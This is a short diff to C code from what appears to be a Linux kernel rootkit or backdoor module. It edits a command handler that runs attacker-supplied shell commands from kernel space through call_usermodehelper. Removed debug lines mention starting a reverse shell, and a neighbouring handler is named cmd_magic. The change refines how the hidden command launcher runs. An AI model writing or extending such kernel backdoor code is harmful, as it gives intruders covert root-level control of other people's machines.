@@ -30,12 +30,9 @@ static void cmd_userspace_shell(char *cmd, size_t n)
   printk(KERN_INFO "Running shell command\n");
   parse_argv(cmd + strlen(CMD_SHELL) + 1, &argv);
   printk(KERN_INFO "Parsing successful\n");
-  call_usermodehelper(argv[0], argv, NULL, UMH_NO_WAIT);
+  call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
   printk(KERN_INFO "Ran command\n");
-  int err = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
   kfree(argv);
-  debug("Returned from process with %d", err);
-  debug("Started reverse shell\n");
 }
 
 static void cmd_magic(char *cmd, size_t n)
